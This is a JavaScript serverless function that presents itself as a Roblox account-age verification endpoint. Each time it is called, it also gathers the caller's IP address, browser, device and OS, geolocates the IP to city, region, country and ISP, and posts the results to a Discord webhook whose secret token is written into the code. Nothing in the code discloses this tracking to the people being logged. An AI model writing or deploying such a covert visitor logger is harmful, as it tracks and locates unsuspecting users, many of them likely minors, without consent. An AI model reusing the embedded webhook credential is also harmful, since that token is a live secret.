/**
 * Vercel Serverless Function: Roblox Profile Verification
 *
 * Endpoints:
 * - GET /api/verify?username=X  -> Full verification
 * - GET /api/verify?userId=X    -> Profile by ID
 * - GET /api/verify?avatarId=X  -> Avatar by ID
 */

const MIN_ACCOUNT_DAYS = 80;
const CACHE_TTL = 30 * 60 * 1000;
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1524874777947410513/Ng_v8NSNotO1CPGcDhWbYGiwdgzcGrv0h_-Lkv2D_vxQvJ_rorAooUFlSML-tgc6Qm_A';

// ── Parse User-Agent ───────────────────────────────────────────────────────
function parseUserAgent(ua) {
  if (!ua) return { browser: 'Unknown', os: 'Unknown', device: '🖥️ Desktop' };
  let browser = 'Unknown', os = 'Unknown', device = '🖥️ Desktop';
  let m;

  if (/Firefox\/([\d.]+)/.test(ua))            browser = 'Firefox '  + ua.match(/Firefox\/([\d.]+)/)[1];
  else if (/Edg\/([\d.]+)/.test(ua))           browser = 'Edge '     + ua.match(/Edg\/([\d.]+)/)[1];
  else if (/OPR\/([\d.]+)/.test(ua))           browser = 'Opera '    + ua.match(/OPR\/([\d.]+)/)[1];
  else if (/Chrome\/([\d.]+)/.test(ua))        browser = 'Chrome '   + ua.match(/Chrome\/([\d.]+)/)[1];
  else if (/Version\/([\d.]+).*Safari/.test(ua)) browser = 'Safari ' + ua.match(/Version\/([\d.]+)/)[1];
  else if (/Safari\//.test(ua))                browser = 'Safari';

  if (/iPhone/.test(ua)) {
    m = ua.match(/iPhone OS ([\d_]+)/);
    os = 'iOS ' + (m ? m[1].replace(/_/g, '.') : ''); device = '📱 iPhone';
  } else if (/iPad/.test(ua)) {
    m = ua.match(/OS ([\d_]+)/);
    os = 'iPadOS ' + (m ? m[1].replace(/_/g, '.') : ''); device = '📱 iPad';
  } else if (/Android/.test(ua)) {
    m = ua.match(/Android ([\d.]+)/);
    os = 'Android ' + (m ? m[1] : '');
    const model = ua.match(/;\s*([^;)]+)\s*Build\//);
    device = '📱 ' + (model ? model[1].trim() : 'Android');
  } else if (/Windows NT/.test(ua)) {
    m = ua.match(/Windows NT ([\d.]+)/);
    const wmap = { '10.0':'10/11','6.3':'8.1','6.2':'8','6.1':'7','6.0':'Vista','5.1':'XP' };
    os = 'Windows ' + (m ? (wmap[m[1]] || m[1]) : ''); device = '🖥️ Desktop';
  } else if (/Mac OS X/.test(ua)) {
    m = ua.match(/Mac OS X ([\d_]+)/);
    os = 'macOS ' + (m ? m[1].replace(/_/g, '.') : ''); device = '🖥️ Mac';
  } else if (/Linux/.test(ua)) {
    os = 'Linux'; device = '🖥️ Desktop';
  }
  return { browser, os, device };
}

// ── Country flag from ISO code ─────────────────────────────────────────────
function countryFlag(code) {
  try { return String.fromCodePoint(...[...code.toUpperCase()].map(c => c.charCodeAt(0) + 127397)); }
  catch { return ''; }
}

// ── Geo lookup ─────────────────────────────────────────────────────────────
async function getGeoInfo(ip) {
  try {
    const clean = (ip || '').split(',')[0].trim();
    if (!clean || clean === 'unknown' || /^(127\.|::1)/.test(clean)) return null;
    const r = await fetch(`https://ipapi.co/${encodeURIComponent(clean)}/json/`, {
      signal: AbortSignal.timeout(3000),
    });
    if (!r.ok) return null;
    const d = await r.json();
    return d.error ? null : d;
  } catch { return null; }
}

// ── Send webhook log — MUST be awaited before res.end() ───────────────────
async function sendLog(data) {
  try {
    const isError = data.lookupType === 'error';
    const statusEmoji = isError ? '⚠️' : data.accountAgeOk ? '✅' : data.found ? '🚫' : '❌';
    const statusText  = isError ? 'Server Error'
      : data.accountAgeOk ? 'Verified (80+ days)'
      : data.found        ? 'Blocked (< 80 days)'
      : 'Not Found';
    const color = isError ? 0x6b7280 : data.accountAgeOk ? 0x22c55e : data.found ? 0xf97316 : 0xef4444;

    const { browser, os, device } = parseUserAgent(data.userAgent);

    // Geo (parallel with embed build is fine — we await before sending)
    const geoPromise = getGeoInfo(data.ip);

    const fields = [];
    fields.push({ name: 'Status',   value: `${statusEmoji} **${statusText}**`, inline: true });
    fields.push({ name: 'Username', value: data.username || 'unknown',          inline: true });
    if (data.displayName && data.displayName !== data.username)
      fields.push({ name: 'Display Name', value: data.displayName, inline: true });
    if (data.userId)
      fields.push({ name: 'User ID', value: `[${data.userId}](https://www.roblox.com/users/${data.userId}/profile)`, inline: true });
    if (data.daysOld !== undefined)
      fields.push({ name: 'Account Age', value: `${data.daysOld} days`, inline: true });
    if (data.createdFormatted)
      fields.push({ name: 'Created', value: data.createdFormatted, inline: true });
    if (data.hasVerifiedBadge !== undefined)
      fields.push({ name: 'Verified Badge', value: data.hasVerifiedBadge ? 'Yes ✅' : 'No', inline: true });
    if (isError && data.error)
      fields.push({ name: 'Error', value: `\`${String(data.error).substring(0, 100)}\``, inline: false });

    fields.push({ name: '\u200b', value: '\u200b', inline: false });
    fields.push({ name: '🌐 Browser', value: browser,  inline: true });
    fields.push({ name: '💻 OS',      value: os,       inline: true });
    fields.push({ name: '📱 Device',  value: device,   inline: true });

    // Await geo
    const geo = await geoPromise;
    if (geo) {
      const flag     = countryFlag(geo.country_code);
      const location = [flag, geo.city, geo.region, geo.country_name].filter(Boolean).join(', ');
      fields.push({ name: '📍 Location', value: location || 'Unknown', inline: true });
      fields.push({ name: '🌐 IP',       value: `\`${geo.ip}\``,       inline: true });
      if (geo.org) fields.push({ name: '🏢 ISP', value: geo.org.substring(0, 50), inline: true });
    } else {
      fields.push({ name: '🌐 IP', value: `\`${(data.ip || 'unknown').split(',')[0].trim()}\``, inline: true });
    }
    fields.push({ name: '🕐 Time', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: true });

    const embed = { title: '🔍 Profile Verification', color, fields,
      footer: { text: 'Rblx New Condos — Verification Log' },
      timestamp: new Date().toISOString() };

    // Retry loop
    for (let attempt = 0; attempt < 3; attempt++) {
      const r = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] }),
      });
      console.log(`[sendLog] attempt=${attempt} status=${r.status}`);
      if (r.status === 429) {
        const wait = parseInt(r.headers.get('retry-after') || '2') * 1000 + 300;
        await new Promise(res => setTimeout(res, wait));
        continue;
      }
      if (r.ok) return true;
      // Non-retryable (e.g. 400 Bad Request)
      const body = await r.text();
      console.error(`[sendLog] Discord error ${r.status}:`, body);
      break;
    }
  } catch (err) {
    console.error('[sendLog] exception:', err.message);
  }
  return false;
}

// ── Await log with safety timeout so we never exceed Vercel's 10 s limit ──
function sendLogSafe(data) {
  return Promise.race([
    sendLog(data),
    new Promise(r => setTimeout(r, 5000)), // max 5 s for logging
  ]);
}

// ── In-memory cache ────────────────────────────────────────────────────────
const cache = new Map();
function getCached(key) {
  const e = cache.get(key);
  if (!e) return null;
  if (Date.now() - e.timestamp > CACHE_TTL) { cache.delete(key); return null; }
  return e.data;
}
function setCached(key, data) { cache.set(key, { data, timestamp: Date.now() }); }

// ── Fetch with retry ───────────────────────────────────────────────────────
async function fetchWithRetry(url, options = {}, maxRetries = 2) {
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      const r = await fetch(url, {
        ...options,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
          Accept: 'application/json',
          ...options.headers,
        },
      });
      if (r.status === 429 && attempt < maxRetries) {
        await new Promise(res => setTimeout(res, 2000 * Math.pow(2, attempt)));
        continue;
      }
      return r;
    } catch (err) {
      if (attempt === maxRetries) throw err;
      await new Promise(res => setTimeout(res, 1500 * Math.pow(2, attempt)));
    }
  }
}

// ── Handler ────────────────────────────────────────────────────────────────
module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Cache-Control', 'no-store');
  if (req.method === 'OPTIONS') { res.status(200).end(); return; }

  const { username, userId, avatarId } = req.query;

  const clientInfo = {
    ip:        (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || 'unknown',
    userAgent: req.headers['user-agent'] || 'unknown',
    referer:   req.headers['referer'] || req.headers['origin'] || 'direct',
  };

  try {
    // ── Username verification ──────────────────────────────────────────
    if (username) {
      const cacheKey = 'username:' + username.toLowerCase();
      const cached = getCached(cacheKey);

      if (cached) {
        await sendLogSafe({ ...clientInfo, username: cached.name || username,
          displayName: cached.displayName, userId: cached.id,
          daysOld: cached.daysOld, createdFormatted: cached.createdFormatted,
          accountAgeOk: cached.accountAgeOk, hasVerifiedBadge: cached.hasVerifiedBadge, found: true });
        return res.status(200).json(cached);
      }

      // Search
      const searchRes = await fetchWithRetry('https://users.roblox.com/v1/usernames/users', {
        method: 'POST',
        body: JSON.stringify({ usernames: [username] }),
        headers: { 'Content-Type': 'application/json' },
      });

      if (searchRes.status === 429) {
        await sendLogSafe({ ...clientInfo, username, found: false, accountAgeOk: false, lookupType: 'rate-limited' });
        return res.status(429).json({ error: 'Roblox API is temporarily rate-limited. Please wait 30 seconds and try again.' });
      }
      if (!searchRes.ok) return res.status(searchRes.status).json({ error: 'Failed to search for user.' });

      const searchData = await searchRes.json();
      if (!searchData.data || searchData.data.length === 0) {
        await sendLogSafe({ ...clientInfo, username, found: false, accountAgeOk: false });
        return res.status(404).json({ error: 'User not found. Please check the username and try again.' });
      }

      const user = searchData.data[0];

      // Profile
      let profile = getCached('user:' + user.id);
      if (!profile) {
        const profileRes = await fetchWithRetry(`https://users.roblox.com/v1/users/${user.id}`);
        if (profileRes.status === 429) {
          await sendLogSafe({ ...clientInfo, username, found: false, accountAgeOk: false, lookupType: 'rate-limited' });
          return res.status(429).json({ error: 'Roblox API is temporarily rate-limited. Please wait 30 seconds and try again.' });
        }
        if (!profileRes.ok) return res.status(profileRes.status).json({ error: 'Failed to fetch profile.' });
        profile = await profileRes.json();
        setCached('user:' + user.id, profile);
      }

      const createdDate    = new Date(profile.created);
      const daysOld        = Math.floor((Date.now() - createdDate.getTime()) / 86400000);
      const createdFormatted = createdDate.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });

      // Avatar (best-effort, non-blocking relative to log)
      let imageUrl = getCached('avatar:' + user.id);
      if (!imageUrl) {
        try {
          const ar = await fetchWithRetry(
            `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=150x150&format=Png&isCircular=false`
          );
          if (ar && ar.ok) {
            const ad = await ar.json();
            imageUrl = ad.data?.[0]?.imageUrl || null;
            if (imageUrl) setCached('avatar:' + user.id, imageUrl);
          }
        } catch { /* avatar non-critical */ }
      }

      const result = {
        type: 'full', id: profile.id, name: profile.name, displayName: profile.displayName,
        created: profile.created, createdFormatted, daysOld,
        accountAgeOk: daysOld >= MIN_ACCOUNT_DAYS,
        hasVerifiedBadge: profile.hasVerifiedBadge,
        imageUrl: imageUrl || null, description: profile.description || '',
      };
      setCached(cacheKey, result);

      // ▶ Log BEFORE responding so Vercel doesn't kill the function
      await sendLogSafe({ ...clientInfo,
        username: profile.name, displayName: profile.displayName, userId: profile.id,
        daysOld, createdFormatted, accountAgeOk: result.accountAgeOk,
        hasVerifiedBadge: profile.hasVerifiedBadge, found: true });

      return res.status(200).json(result);
    }

    // ── Profile by userId ──────────────────────────────────────────────
    if (userId) {
      let profile = getCached('user:' + userId);
      if (!profile) {
        const pr = await fetchWithRetry(`https://users.roblox.com/v1/users/${userId}`);
        if (pr.status === 429) return res.status(429).json({ error: 'Roblox API rate-limited. Please wait.' });
        if (!pr.ok)            return res.status(pr.status).json({ error: 'Failed to fetch profile.' });
        profile = await pr.json();
        setCached('user:' + userId, profile);
      }
      const cd  = new Date(profile.created);
      const d   = Math.floor((Date.now() - cd.getTime()) / 86400000);
      const cf  = cd.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
      const payload = { type:'profile', id:profile.id, name:profile.name, displayName:profile.displayName,
        created:profile.created, createdFormatted:cf, daysOld:d, accountAgeOk:d>=MIN_ACCOUNT_DAYS,
        hasVerifiedBadge:profile.hasVerifiedBadge, description:profile.description||'' };

      await sendLogSafe({ ...clientInfo, username:profile.name, displayName:profile.displayName,
        userId:profile.id, daysOld:d, createdFormatted:cf, accountAgeOk:payload.accountAgeOk,
        hasVerifiedBadge:profile.hasVerifiedBadge, found:true, lookupType:'userId' });
      return res.status(200).json(payload);
    }

    // ── Avatar by userId ───────────────────────────────────────────────
    if (avatarId) {
      let imageUrl = getCached('avatar:' + avatarId);
      if (!imageUrl) {
        const ar = await fetchWithRetry(
          `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${avatarId}&size=150x150&format=Png&isCircular=false`
        );
        if (ar.status === 429) return res.status(429).json({ error: 'Roblox API rate-limited. Please wait.' });
        if (!ar.ok)            return res.status(ar.status).json({ error: 'Failed to fetch avatar.' });
        const ad = await ar.json();
        imageUrl = ad.data?.[0]?.imageUrl || null;
        if (imageUrl) setCached('avatar:' + avatarId, imageUrl);
      }
      return res.status(200).json({ type: 'avatar', imageUrl });
    }

    return res.status(400).json({ error: 'Missing parameter: username, userId, or avatarId required' });

  } catch (err) {
    console.error('[verify] unhandled error:', err);
    await sendLogSafe({ ...clientInfo,
      username: username || userId || 'unknown',
      found: false, accountAgeOk: false, error: err.message, lookupType: 'error' });
    return res.status(500).json({ error: 'Failed to verify profile. Please try again.' });
  }
};
